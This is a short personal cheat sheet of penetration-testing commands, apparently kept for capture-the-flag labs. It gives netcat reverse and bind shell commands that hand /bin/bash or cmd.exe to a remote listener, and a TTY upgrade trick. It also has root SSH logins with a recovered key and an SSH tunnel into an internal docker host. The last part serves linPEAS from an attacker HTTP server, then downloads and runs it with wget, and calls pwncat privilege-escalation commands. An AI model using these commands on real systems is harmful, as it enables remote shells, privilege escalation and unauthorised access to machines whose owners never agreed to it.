# https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# Reverse Shell example:
#On the attacking machine:
sudo nc -lvnp 443
#On the target:
nc <LOCAL-IP> <PORT> -e /bin/bash

# Bind Shell example:
#On the target:
nc -lvnp <port> -e "cmd.exe"
#On the attacking machine:
nc MACHINE_IP <port>

# Normal look:
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl + Z
stty raw -echo; fg

# SSH
# Unable to negotiate with <IP> port 22: no matching how to key type found. Their offer: ssh-rsa, ssh-dss
-oHostKeyAlgorithms=+ssh-rsa
# SSH Key
ls -la /.ssh
chmod 600 root_key
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.232.194

# SSH Tuneling docker
ssh -L 7777:182.17.0.2:8080 aubreanna@internal.thm
localhost:7777

# Python serwer
cd /home/arek/Desktop/Notatki/Scrypty && sudo python3 -m http.server 80
# PrivEsc script
cd /tmp
wget http://10.14.84.79:80/linPEAS.sh
chmod +x linPEAS.sh
./linPEAS.sh

# Pwncat
pwncat -l 4444
# CTRL + D
privesc -l